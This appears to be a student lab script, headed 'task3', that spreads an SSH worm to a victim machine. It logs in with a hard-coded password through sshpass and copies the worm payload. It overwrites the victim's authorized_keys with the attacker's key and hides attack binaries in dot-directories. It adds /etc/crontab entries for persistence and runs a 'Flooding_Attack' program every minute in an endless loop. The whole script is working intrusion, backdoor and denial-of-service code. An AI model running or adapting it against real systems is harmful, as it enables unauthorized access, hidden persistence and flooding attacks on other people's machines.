# task3
# input victim's IP address
export SSHPASS='victim'

read -p "Enter Victim IP Address: " IP_Address
read -p "First?(y/n) " First

sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop

# publickey
SSH_PATH="/home/victim/.ssh"

if [ "$First" = "y" ];
then
	(
	echo "\r"
	sleep 1
	echo "y\r"
	sleep 1
	echo "\r"
	sleep 1
	echo "\r"
	)|ssh-keygen
else 
	(
	echo "\r"
	sleep 1
	echo "n\r"
	sleep 1
	)|ssh-keygen
fi

# sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####

ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.qq"; mkdir -p $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1; chmod 777 $Hidden1 > /dev/null 2>&1'
echo "qq1"
ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2; chmod 777 $Hidden2 > /dev/null 2>&1'
echo "qq2"
ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
while [ 1 ]
do
	ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; cd "$Hidden2" && ./Flooding_Attack'
	sleep 60
done



echo "qq3"










